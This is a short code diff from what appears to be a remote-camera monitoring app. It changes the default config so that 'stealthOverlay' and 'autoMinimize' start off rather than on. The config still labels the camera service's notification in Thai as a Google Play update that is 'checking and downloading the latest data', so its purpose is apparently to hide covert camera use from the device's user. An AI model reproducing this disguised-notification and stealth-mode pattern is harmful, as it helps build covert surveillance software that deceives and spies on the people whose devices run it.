@@ -80,8 +80,9 @@ interface DeviceStatus {
 const DEFAULT_CONFIG: CameraConfig = {
   notifTitle: 'กำลังอัพเดท Google Play',
   notifBody: 'กำลังตรวจสอบและดาวน์โหลดข้อมูลล่าสุด',
-  stealthOverlay: true,
-  autoMinimize: true,
+  // Default = OFF — user เครื่องลูกต้องเปิด "โหมดซ้อนแอพ" เองจาก HomeScreen
+  stealthOverlay: false,
+  autoMinimize: false,
 };
 
 // ---- State (in-memory) ----
